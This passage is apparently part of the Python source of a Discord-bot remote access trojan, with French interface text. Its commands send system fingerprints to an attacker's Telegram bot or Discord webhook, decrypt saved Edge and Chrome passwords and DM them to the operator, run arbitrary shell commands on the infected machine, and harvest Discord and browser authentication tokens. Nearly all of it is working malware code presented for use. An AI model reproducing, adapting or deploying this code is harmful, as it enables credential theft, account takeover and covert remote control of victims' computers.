                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.command()
async def recovery(ctx):
    choice_embed = discord.Embed(
        title="Choisissez une manière de recevoir les informations de l'appareil infécté",
        description="Pour le BOT Telegram, le programme auras besoin de :\n- Chat ID\n- Token du BOT\n\nPour le Webhook Discord le programme aura besoin de :\n- Webhook URL",
        color=discord.Color.blue()
    )

    class ButtonView(discord.ui.View):
        @discord.ui.button(label="BOT Telegram", style=ButtonStyle.primary, custom_id="bouton_1")
        async def telegram_button(self, interaction: Interaction, button: discord.ui.Button):
            class TelegramBOTConfiguration(discord.ui.Modal, title="Configuration du BOT Telegram"):
                chat_id = discord.ui.TextInput(
                    label="Chat ID",
                    placeholder="Entrez l'ID de votre chat ici...",
                    required=True,
                )

                telegram_BOT_token = discord.ui.TextInput(
                    label="Token de votre BOT ",
                    placeholder="Entrez le token de votre BOT ici...",
                    required=True,
                )

                async def on_submit(self, interaction: discord.Interaction):
                    hostname = socket.gethostname()
                    pc_ip = socket.gethostbyname(hostname)
                    pc_name = os.getlogin()
                    pc_gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
                    pc_cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
                    pc_ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
                    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
                    pc_uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

                    MESSAGE = f"""*SYSTEM INFOS*
*PC Name* : ` {pc_name} `
*GPU*     : ` {pc_gpu} `
*CPU*     : ` {pc_cpu} `
*RAM*     : ` {pc_ram} Go `
*IP*      : ` {pc_ip} `
*UUID*    : ` {pc_uuid} `
*MAC*     : ` {mac_address} `
"""
                    try:
                        telegram_bot = Bot(token=self.telegram_BOT_token.value)
                        await telegram_bot.send_message(chat_id=self.chat_id.value, text=MESSAGE, parse_mode="MarkdownV2")

                        success_sent_to_telegram_bot_embed = discord.Embed(
                            title="Les informations ont bien étés envoyées",
                            description=f"Token : ` {self.telegram_BOT_token.value} `\nChat ID : {self.chat_id.value}",
                            color=discord.Color.green()
                        )

                        await interaction.response.send_message(embed=success_sent_to_telegram_bot_embed)
                    except Exception as e:
                        failed_sent_to_telegram_bot_embed = discord.Embed(
                            title="Erreur lors de l'envoi des information au bot",
                            description=f"Token : ` {self.telegram_BOT_token.value} `\nChat ID : {self.chat_id.value}\n\n**Conseil :** revérifiez la validité de votrechat ID et du token de votre bot\n\n**Erreur :** {e}",
                            color=discord.Color.red()
                        )

                        await interaction.response.send_message(embed=failed_sent_to_telegram_bot_embed)

            telegram_embed = discord.Embed(
                title=f"Entrez votre chat ID et le token de votre BOT",
                description="Ces informations seront utilisées pour envoyer les informations de l'appareil infécté via votre BOT Telegram",
                color=discord.Color.blue()
            )

            telegram_embed.set_thumbnail(
                url="https://logospng.org/download/telegram/logo-telegram-4096.png"
            )

            await ctx.send(embed=telegram_embed)
            await interaction.response.send_modal(TelegramBOTConfiguration())

        @discord.ui.button(label="Webhook Discord", style=ButtonStyle.danger, custom_id="bouton_2")
        async def webhook_button(self, interaction: Interaction, button: discord.ui.Button):
            class DiscordWEBHOOKConfiguration(discord.ui.Modal, title="Configuration du Webhook Discord"):
                webhook_url = discord.ui.TextInput(
                    label="Url du webhook",
                    placeholder="Entrez l'url de votre webhook ici...",
                    required=True,
                )
            
                async def on_submit(self, interaction: discord.Interaction):
                    hostname = socket.gethostname()
                    pc_ip = socket.gethostbyname(hostname)
                    pc_name = os.getlogin()
                    pc_gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
                    pc_cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
                    pc_ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
                    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
                    pc_uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

                    embed_data = {
    "embeds": [
        {
            "title": "SYSTEM INFOS",  
            "description": f"**PC Name** : ` {pc_name} `\n**GPU**     : ` {pc_gpu} `\n**CPU**     : ` {pc_cpu} `\n**RAM**     : ` {pc_ram} Go `\n**IP**      : ` {pc_ip} `\n**UUID**    : ` {pc_uuid} `\n**MAC**     : ` {mac_address} `", 
            "thumbnail": {
                "url": "https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
                },
            "color": 0x00ff00,
        }
    ]
}



                    try:
                        response = requests.post(self.webhook_url.value, json=embed_data)
                        if response.status_code == 204:
                            success_sent_to_telegram_bot_embed = discord.Embed(
                                title="Les informations ont bien étés envoyées",
                                description=f"Url du Webhook : ` {self.webhook_url.value} `",
                                color=discord.Color.green()
                            )

                            await interaction.response.send_message(embed=success_sent_to_telegram_bot_embed)

                        else:
                            failed_sent_to_telegram_bot_status_code_embed = discord.Embed(
                                title="Impossible d'envoyer les informations au Webhook",
                                description=f"Url du Webhook : ` {self.webhook_url.value} `\nErreur : {response.status_code}\n\n**Conseil :** revérifiez la validité de l'url de votre webhook",
                                color=discord.Color.red()
                            )

                            await ctx.send(embed=failed_sent_to_telegram_bot_status_code_embed)

                    except Exception as e:
                        failed_sent_to_telegram_bot_embed = discord.Embed(
                            title="Erreur lors de l'envoi des information au bot",
                            description=f"Url du Webhhok : ` {self.webhook_url.value} `\n\n**Conseil :** revérifiez la validité de l'url de votre webhook\n**Erreur :** {e}",
                            color=discord.Color.red()
                        )
                        await ctx.send(embed=failed_sent_to_telegram_bot_embed)

            webhook_embed = discord.Embed(
                    title=f"Entrez le lien de votre Webhook",
                    description="Il seras utilisé pour envoyer les informations dans le salon associé au webhook.\n\n**Remarque :** Il n'est pas obligatoire que le webhook ait été créé dans le même serveur que le RAT.",
                    color=discord.Color.blue()
                )

            webhook_embed.set_thumbnail(
                    url="https://logodownload.org/wp-content/uploads/2017/11/discord-logo-1-1.png"
                )

            await ctx.send(embed=webhook_embed)
            await interaction.response.send_modal(DiscordWEBHOOKConfiguration())
        
    await ctx.send(embed=choice_embed, view=ButtonView())

@BOT.command()
async def stealpass(ctx): 
    user = os.getlogin()
    local_state_path = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Local State"
    passwords_count_edge = 0
    passwords_count_chrome = 0
    if os.path.exists(local_state_path):
      try:
         with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)

         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
         master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
      except Exception:
         pass

      login_data_path = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
      os.system("TASKKILL /F /IM msedge.exe")
      if os.path.exists(login_data_path):
         try:
            conn = sqlite3.connect(login_data_path)
            cursor = conn.cursor()

            query = "SELECT origin_url, username_value, password_value FROM logins"
            cursor.execute(query)

            with open(f"passedge.txt", "w", encoding='utf-8') as pass_file:
                pass_file.write("""
                                              ________________
         <===================================[PASSWORDS : Edge]===================================>
         """)
                for row in cursor.fetchall():
                  passwords_count_edge += 1
                  origin_url = row[0]
                  username = row[1]
                  encrypted_password = row[2] 

                  iv = encrypted_password[3:15]
                  payload = encrypted_password[15:]
                  cipher = AES.new(master_key, AES.MODE_GCM, iv)
                  decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                  pass_file.write(f"""
         ___________________________________________________________________________________________
         URL : {origin_url}
         USERNAME/MAIL : {username}
         PASSWORD : {decrypted_pass}""")
                
                pass_file.close()
                file = discord.File("passedge.txt", filename="passedge.txt")

                await ctx.author.send(file=file)

                successuflly_stolen_pass = discord.Embed(
                    title="Pass (edge) volées !",
                    description=f"Nombre de pass trouvé : {passwords_count_edge}\n\nLe fichier texte qui les contient vous a été envoyé en MP.",
                    color=discord.Color.blue()
                )
                await ctx.send(embed=successuflly_stolen_pass)
                time.sleep(1)
                os.remove("passedge.txt")
         except Exception:
            passwords_count_edge = "An error occured"
            pass
         finally:
            conn.close()

    local_state_path = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Local State"

    if os.path.exists(local_state_path):
      try:
         with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)

         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
         master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
      except Exception as e:
        error_embed = discord.Embed(
                title="Une erreur est survenue pour Edge",
                description=f"Il semblerait qu'une erreur soit survenue.\n\n**Détails :** {e}",
                color=discord.Color.red()
            )
        await ctx.send(embed=error_embed)

    login_data_path = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Login Data"

    if os.path.exists(login_data_path):
        try:
            conn = sqlite3.connect(login_data_path)
            cursor = conn.cursor()
            os.system("TASKKILL /F /IM chrome.exe")
            query = "SELECT origin_url, username_value, password_value FROM logins"
            cursor.execute(query)

            with open(f"passchrome.txt", "w", encoding='utf-8') as pass_file:

                pass_file.write("""
        <===================================[PASSWORDS : Chrome]===================================>
        """)
                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    encrypted_password = row[2] 
                    passwords_count_chrome += 1
                    iv = encrypted_password[3:15]
                    payload = encrypted_password[15:]
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                    pass_file.write(f"""
            ___________________________________________________________________________________________
            URL : {origin_url}
            USERNAME/MAIL : {username}
            PASSWORD : {decrypted_pass}""")
                
                pass_file.close()
                file = discord.File("passchrome.txt", filename="passchrome.txt")

                await ctx.author.send(file=file)

                successuflly_stolen_pass = discord.Embed(
                    title="Pass (chrome) volées !",
                    description=f"Nombre de pass trouvé : {passwords_count_chrome}\n\nLe fichier texte qui les contient vous a été envoyé en MP.",
                    color=discord.Color.blue()
                )
                await ctx.send(embed=successuflly_stolen_pass)
                time.sleep(1)
                os.remove("passchrome.txt")
        except Exception as e:
            error_embed = discord.Embed(
                title="Une erreur est survenue pour Chrome",
                description=f"Il semblerait qu'une erreur soit survenue.\n\n**Détails :** {e}",
                color=discord.Color.red()
            )
            await ctx.send(embed=error_embed)
        finally:
            conn.close()
    
@BOT.command()
async def exeout(ctx, *, cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if len(result.stdout) > 500:
            exeout_embed = discord.Embed(
                title="Commande executée.",
                description=f"La commande ``` {cmd} ``` a été exécutée sur l'ordinateur cible.\n\n**Résultat de la commande :**\n``` Le contenu a été envoyé sous forme de fichier texté étant donné qu'il comporte trop de caractères. ```",
                color=discord.Color.blue()
            )
            await ctx.send(embed=exeout_embed)
        
            with open("exeout_result.txt", "w", encoding='utf-8') as file:
                file.write(f"<=======================[COMMAND OUTPUT]=======================>\n\n{result.stdout}")
                file = discord.File("exeout_result.txt", filename="exeout_result.txt")
                await ctx.send(file=file)
            os.remove("exeout_result.txt")

        else:        
            exeout_embed = discord.Embed(
                title="Commande executée.",
                description=f"La commande ``` {cmd} ``` a été exécutée sur l'ordinateur cible.\n\n**Résultat de la commande :**\n``` {result.stdout} ```",
                color=discord.Color.blue()
            )
            await ctx.send(embed=exeout_embed)

    except Exception as e:
        error_embed = discord.Embed(
                title="Une erreur est survenue",
                description=f"Il semblerait qu'une erreur soit survenue lors de l'execution de la commande.\n\n**Détails :** {e}",
                color=discord.Color.red()
            )
        await ctx.send(embed=error_embed)

@BOT.command()
async def tasklist(ctx):
    user = os.getlogin()

    try:
        result = subprocess.run("tasklist", shell=True, capture_output=True, text=True)
        successfully_recovered_tasklist_embed = discord.Embed(
            title="Liste des processus en cours récupérées",
            color=discord.Color.blue()
        )
        await ctx.send(embed=successfully_recovered_tasklist_embed)

        with open("tasklist.txt", "w", encoding='utf-8') as file:
            file.write(f"<==============================[ALL TASKS ON EXECUTION FOR {user}]==============================>\n\n{result.stdout}")
            file = discord.File("tasklist.txt", filename="tasklist.txt")
            await ctx.send(file=file)
        os.remove("tasklist.txt")

    except Exception as e:
        error_embed = discord.Embed(
                title="Une erreur est survenue",
                description=f"Il semblerait qu'une erreur soit survenue lors de la récupération de la liste des processus en cours sur l'appreil ` {user} `.\n\n**Détails :** {e}",
                color=discord.Color.red()
            )
        await ctx.send(embed=error_embed)

@BOT.command()
async def edgepage(ctx, *, website):
    try:
        os.system(f'start msedge "{website}"')
        page_opened_embed = discord.Embed(
            title="Page ouverte",
            description="Une page à été ouverte avec l'url {website} sur Edge.",
            color=discord.Color.blue()
        )
        await ctx.send(embed=page_opened_embed)
    except Exception as e:
        error_embed = discord.Embed(
                title="Une erreur est survenue",
                description=f"Il semblerait qu'une erreur soit survenue lors de l'exécution de la commande sur l'url {website}'.\n\n**Détails :** {e}",
                color=discord.Color.red()
            )
        await ctx.send(embed=page_opened_embed)

@BOT.command()
async def tokens(ctx):
    user = os.getlogin()
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = [
        roaming + "\\Discord",
        roaming + "\\discordcanary",
        roaming + "\\discordptb",
        local + "\\Google\\Chrome\\User Data\\Default",
        roaming + "\\Opera Software\\Opera Stable",
        local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        local + "\\Yandex\\YandexBrowser\\User Data\\Default"
    ]

    regex1 = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
    regex2 = r"mfa\.[\w-]{84}"
    encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{120}"

    def getheaders(token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            return decrypt_payload(cipher, payload)[:-16].decode()
        except:
            return None

    def get_master_key(path):
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]

    def gettokens(path):
        tokens = []
        if os.path.exists(path):
            try:
                for file_name in os.listdir(os.path.join(path, "Local Storage", "leveldb")):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    with open(os.path.join(path, "Local Storage", "leveldb", file_name), "r", errors="ignore") as file:
                        for line in file.readlines():
                            tokens.extend(re.findall(regex1, line))
                            tokens.extend(re.findall(regex2, line))
                            for enc_token in re.findall(encrypted_regex, line):
                                try:
                                    master_key = get_master_key(path)
                                    decrypted = decrypt_password(base64.b64decode(enc_token.split("dQw4w9WgXcQ:")[1]), master_key)
                                    if decrypted:
                                        tokens.append(decrypted)
                                except:
                                    pass
            except:
                pass
        return tokens

    all_tokens = []
    for path in paths:
        all_tokens.extend(gettokens(path))

    if all_tokens:
        with open("tokens.txt", "w", encoding='utf-8') as file:
            file.write(f"<=========================[TOKENS FOR {user}]=========================>\n\n")
            for i, token in enumerate(set(all_tokens), 1):
                file.write(f"{i} - TOKEN : {token}\n")
            txt_file = discord.File("tokens.txt", filename="token.txt")
            found_tokens_embed = discord.Embed(
            title="Jetons Trouvés", 
            description=f"Les jetons on été envoyés en MP\n\n**Jetons trouvés :** {len(all_tokens)}", 
            color=discord.Color.blue())
        await ctx.send(embed=found_tokens_embed)
        await ctx.author.send(file=txt_file)
        os.remove("tokens.txt")
    else:
        no_token_embed = discord.Embed(
            title="Aucun jeton trouvé",
            description="Aucun jeton n'a été retrouvé",
            color=discord.Color.red()
        )
        await ctx.send(embed=no_token_embed)


BOT.run(BOT_TOKEN)